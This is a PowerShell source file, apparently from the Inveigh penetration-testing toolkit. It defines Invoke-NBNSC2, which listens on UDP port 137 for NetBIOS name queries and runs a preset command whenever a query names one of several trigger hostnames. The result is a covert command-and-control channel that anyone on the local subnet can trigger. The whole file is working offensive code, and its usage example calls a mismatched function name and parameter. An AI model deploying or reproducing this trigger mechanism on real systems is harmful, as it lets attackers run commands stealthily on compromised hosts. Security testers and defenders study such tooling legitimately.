function Invoke-NBNSC2
{
<#
.SYNOPSIS
Invoke-NBNSC2 will listen for NBNS requests and execute set commands if requests for specific hostnames are
received. The function must be supplied with an even number of Hostnames and Commands. NBNS requests can be
sent from a NBNS enabled system on the same subnet using ping, etc.

.PARAMETER Hostnames
A comma separated list of Hostnames that will trigger a corresponding command. The first hostname trigger a command
from the Commands array with a matching index (e.g. Hostnames[0] executes Commands[0]).

.PARAMETER Commands
An array of commands stored in scriptblock format. All commands must be enclosed in {} brackets.

.PARAMETER ExitHostname
Specify a hostname that will cause the function to exit. This hostname must not match a hostname used in Hostnames.

.PARAMETER RunTime
(Integer) Set the run time duration.

.PARAMETER RunTimeUnit
Default = Minutes: Set the time unit for RunTime to either Minutes, Hours, or Days.

.EXAMPLE
Send-NBNSC2 -Hostnames test1,test2 -Command {calc},{notepad} -RunTime 1 -RunTimeUnit Days

.LINK
https://github.com/Kevin-Robertson/Inveigh
#>

[CmdletBinding()]
param
(
[parameter(Mandatory=$true)][Array]$Hostnames = "",
[parameter(Mandatory=$true)][Array]$Commands = "",
[parameter(Mandatory=$true)][String]$ExitHostname = "",
[parameter(Mandatory=$false)][Int]$RunTime="",
[parameter(Mandatory=$false)][ValidateSet("Minutes","Hours","Days")][String]$RunTimeUnit="Minutes",
[parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)

if ($invalid_parameter)
{
    throw "$($invalid_parameter) is not a valid parameter."
}

if($Hostnames.Count -ne $Commands.Count)
{
    throw "Must use an equal number of Hostnames and Commands."
}
elseif($Hostnames -contains $ExitHostname)
{
    throw "ExitHostname cannot be used as in Hostnames."
}

if($RunTime)
{   
    if($RunTimeUnit -like 'Minutes')
    {
        $runtime_timeout = new-timespan -Minutes $RunTime
    }
    elseif($RunTimeUnit -like 'Hours')
    {
        $runtime_timeout = new-timespan -Hours $RunTime
    }
    elseif($RunTimeUnit -like 'Days')
    {
        $runtime_timeout = new-timespan -Days $RunTime
    }

    $runtime_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
}

$Hostnames = $Hostnames | % {$_.ToUpper()}
$running = $true
$NBNS_listener_endpoint = New-Object System.Net.IPEndPoint ([IPAddress]::Broadcast,137)
$NBNS_UDP_client = New-Object System.Net.Sockets.UdpClient 137
$NBNS_UDP_client.Client.ReceiveTimeout = 10000
$control_timeout = new-timespan -Seconds 1
$control_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()

while($running)
{
    try
    {
        $NBNS_request_data = $NBNS_UDP_client.Receive([Ref]$NBNS_listener_endpoint)
    }
    catch
    {
        $NBNS_request_data = $null
    }

    if($NBNS_request_data)
    {
        $NBNS_query_string_encoded = $([Text.Encoding]::UTF8.GetString($NBNS_request_data))
        $NBNS_query_string_encoded = $NBNS_query_string_encoded.SubString(13,($NBNS_query_string_encoded.Length - 16))
        $NBNS_query_string_encoded = $NBNS_query_string_encoded -replace "00",""

        if($NBNS_query_string_encoded -like '*CA*')
        {
            $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf("CA"))
        }

        $NBNS_query_string_subtracted = ""
        $NBNS_query_string = ""
        $n = 0
                            
        if($NBNS_query_string_encoded.Length -gt 1)
        {
            do
            {
                $NBNS_query_string_sub = (([Byte][Char]($NBNS_query_string_encoded.Substring($n,1))) - 65)
                $NBNS_query_string_subtracted += ([System.Convert]::ToString($NBNS_query_string_sub,16))
                $n += 1
            }
            until($n -gt ($NBNS_query_string_encoded.Length - 1))
                   
            $n = 0
                    
            do
            {
                $NBNS_query_string += ([Char]([System.Convert]::ToInt16($NBNS_query_string_subtracted.Substring($n,2),16)))
                $n += 2
            }
            until($n -gt ($NBNS_query_string_subtracted.Length - 1) -or $NBNS_query_string.Length -eq 15)
        }

        if([Array]::IndexOf($Hostnames,$NBNS_query_string) -ge 0 -and $control_stopwatch.Elapsed -ge $control_timeout)
        {
            $NBNS_UDP_client.Close()
            $command_index = [Array]::IndexOf($Hostnames,$NBNS_query_string)
            $NBNS_query_string = ''
            & $Commands[$command_index]
            $control_timeout = new-timespan -Seconds 5
            $control_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
            $NBNS_UDP_client = New-Object System.Net.Sockets.UdpClient 137
            $NBNS_UDP_client.Client.ReceiveTimeout = 10000
        }
        elseif($ExitHostname -like $NBNS_query_string)
        {
            $running = $false
        }
    }

    if($RunTime -and $runtime_stopwatch.Elapsed -ge $runtime_timeout)
    {
        $running = $false
    }

}

$NBNS_UDP_client.Close()

}